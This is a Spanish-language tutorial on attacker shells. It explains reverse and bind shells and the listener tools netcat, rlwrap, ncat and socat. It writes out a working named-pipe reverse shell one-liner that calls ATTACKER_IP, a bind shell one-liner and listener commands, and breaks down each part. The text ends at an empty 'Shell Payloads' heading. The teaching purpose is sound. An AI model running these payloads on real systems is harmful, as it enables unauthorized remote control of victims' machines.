## ¿Qué es?

Un Shell es un software que nos permite interactuar con un Sistema Operativo. Puede tener una interfaz gráfica, pero usualmente es una interfaz por líneas de comandos.

En ciberseguridad, comúnmente se refiere a una sesión shell especifica que un atacante usa cuando accede a un sistema comprometido, permitiendoles ejecutar comandos y software. Esto los habilita de ejecutar varias actividades, como:

* Remote System Control: Permite al atacante ejecutar comandos o software remotamente en el sistema objetivo.
* Privilige Escalation: Si un acceso inicial a través de un shell está limitado o restringido, los atacantes pueden explorar maneras de escalar privilegios para estár más elevados o tener acceso administrativo.
* Data Exfiltration: Una vez el atacante tienen acceso para ejecutar comandos a través de la shell obtenida, pueden explorar el sistema para leer y copiar datos sensibles de él.
* Persistence and Maintenance Access: Una vez la shell es obtenida, los atacantes pueden crear accesos a través de usuarios y credenciales o copiar software de backdoor para mantener acceso al sistema objetivo para usos posteriores.
* Post-Exploitation Activities: Después del acceso de la shell garantizado, los atacantes pueden realizar una gran variedad de actividades post-exploitation, como desplegar malware, crear cuentas ocultas, y eliminar información.
* Access Other Systems on the Network: Dependiendo de las intenciones del atacante, la shell obtenida puede ser sólo un punto de acceso inicial. El objetivo puede ser saltar a través de la red a diferentes objetivos usando la shell obtenida como pivot a diferentes puntos en el sistema de red comprometido. A esto se le conoce como pivoting.

## Reverse Shell

Una shell reversa, a veces referida como "connect back shell", es una de las técnicas más populares para ganar acceso a un sistema. La conexión inicia desde el sistema del objetivo hacia la máquina del atacante, lo cual puede ayudar a evitar la detección desde los firewalls de la red y otras aplicaciones de seguridad.

### Netcat

Esta utilidad soporta mútliples OSs y permite leer y escribir a través de una red. Podemos usar Netcat para escuchar una conexión usando el comando `nc -lvnp 443`.

Este comando usa:

* `-l`: Indicar a Netcat que escuche o espere por una conexión.
* `-v`: Verbose mode.
* `-n`: Previene que las conexiones usen DNS, para que no resuelvan ningún hostname y usen la dirección IP.
* `-p`: Indica el puerto a usar para esperar la conexión.

Una vez tenemos nuestro listener listo, el atacante debería ejecutar lo que se conoce como un reverse shell payload. Este payload usualmente abusa la vulnerabilidad o acceso no autorizado garantizado por el atacante y ejecuta un comando que va a exponer la shell a través de la red. Hay una variedad de payloads que van a depender de las herrramientas y OS del sistema comprometido. Podemos ver algunas [aquí.](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) 

Como ejemplo, vamos a analizar el siguiente ejemplo de payload llamado `pipe reverse shell`:

```shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

* `rm -f /tmp/f`: Ese comando remueve cualquier archivo pipe con archivo localizado en `/tmp/f`. Esto asegura que el script puede crear un nuevo named pipe sin conflictos.
* `mkfifo /tmp/f`: Este comando crea un named pipe, o FIFO (first-in first-out) en `/tmp/f`. Las tuberías con nombre permiten la comunicación bidireccional entre procesos. En este contexto, actúan como un conducto para la entrada y la salida de datos.
* `cat /tmp/f`: Este comando lee datos desde la named pipe. Espera por input que puede ser enviado a través de la tubería.
* `| bash -i 2>&1`: El output de `cat` es piped a una shell instance (`bash-i`), esto permite que el atacante ejecute comandos interactivamente. La instrucción `2>&1` redirige el error estándar a la salida estándar, asegurando que los mensajes de error se envíen de vuelta al atacante.
* `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f`: Esta parte dirige la salida de la shell por medio de `nc` (Netcat) a la dirección IP del atacante (`ATTACKER_IP`) en el puerto del atacante (`ATTACKER_PORT`).
* `>/tmp/f`: Esta parte final envía la salida de los comandos de vuelta al named pipe, permitiendo comunicación bi-direccional.

La carga útil anterior puede exponer el intérprete de comandos `bash` a través de la red al oyente deseado.

Una vez el payload es ejecutado, el atacante va a recibir una reverse shell, permitiéndole ejecutar comandos como si estuvieran con sesión iniciada en una terminal regular en el OS.

## Bind Shell

Como su nombre indica, un shell de enlace vinculará un puerto en el sistema comprometido y escuchará una conexión; cuando se produce esta conexión, expone la sesión del shell para que el atacante pueda ejecutar comandos de forma remota.

El atacante puede usar un comando como este:

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`.

* `rm -f /tmp/f`: Ese comando remueve cualquier archivo pipe con archivo localizado en `/tmp/f`. Esto asegura que el script puede crear un nuevo named pipe sin conflictos.
* `mkfifo /tmp/f`: Este comando crea un named pipe, o FIFO (first-in first-out) en `/tmp/f`. Las tuberías con nombre permiten la comunicación bidireccional entre procesos. En este contexto, actúan como un conducto para la entrada y la salida de datos.
* `cat /tmp/f`: Este comando lee datos desde la named pipe. Espera por input que puede ser enviado a través de la tubería.
* `| bash -i 2>&1`: El output de `cat` es piped a una shell instance (`bash-i`), esto permite que el atacante ejecute comandos interactivamente. La instrucción `2>&1` redirige el error estándar a la salida estándar, asegurando que los mensajes de error se envíen de vuelta al atacante.
* `| nc -l 0.0.0.0 8080`: Empieza el modo escucha de Netcat (`-l`) en todas las interfaces (`0.0.0.0`) en el puerto `8080`. El shell va a ser expuesto al atacante una vez se conecta este puerto.
* `>/tmp/f`: Esta parte final envía la salida de los comandos de vuelta al named pipe, permitiendo comunicación bi-direccional.

Este comando ahora va a escuchar conexiones entrantes y exponer la interfaz de comandos `bash`. Debemos notar que los puertos por debajo de 1024 requieren que Netcat se ejecute con privilegios elevados. En este caso, usamos el puerto 8080 para evitar esto.

Ahora que la máquina objetivo está esperando conexiones entrantes, podemos usar Netcat nuevamente con el siguiente comando para conectar:

```shell
nc -nv TARGET_IP 8080
```

* `nc`: Invoca a Netcat, el cual establece la conexión con el objetivo.
* `-n`: Deshabilita la resolución DNS, permitiendo a Netcat operar rápidamente y evitar búsquedas innecesarias.
* `-v`: Verbose mode.
* `TARGET_IP`: La dirección IP del objetivo donde el bind shell está ejecutándose.
* `8080`: El número del puerto en el cual el bind shell está escuchando.

## Shell Listeners

Vamos a explorar algunas herramientas que pueden ser usadas para interactuar con una shell entrante.

### Rlwrap

Se trata de una pequeña utilidad que utiliza la biblioteca GNU readline para proporcionar un teclado de edición y un historial de comandos.

Ejemplo (mejorando una Shell Netcat con Rlwrap):

```shell
rlwrap nc -lvnp 443
```

Esto envuelve `nc` con `rlwrap`, permitiendo a los usuarios usar catacterísticas como las teclas de flecha y el historial para una mejor interacción.

### Ncat

Ncat es la versión mejorada de Netcap distribuido por el proyecto Nmap. Ofrece características extras, como encripción (SSL).

Ejemplo para escuchar Reverse Shells:

```shell
ncat -lvnp 4444
```

Ejemplo para escuchar Reverse Shells con SSL:

```shell
ncat --ssl -lvnp 4444
```

### Socat

Es una utilidad que nos permite crear un socket de conexión entre dos orígenes de datos, en este caso, dos hosts diferentes.

```shell
socat -d -d TCP-LISTEN:443 STDOUT
```

* `-d`: Activa el verbose output, se usa dos veces para incrementar el nivel de detalle de los comandos.
* `TCP-LISTE:443`: Crea un listener TCP en el puerto `443`, estableciendo un server socket para conexiones entrantes.
* `STDOUT`: Direcciona cualquier data entrante a la terminal.

## Shell Payloads

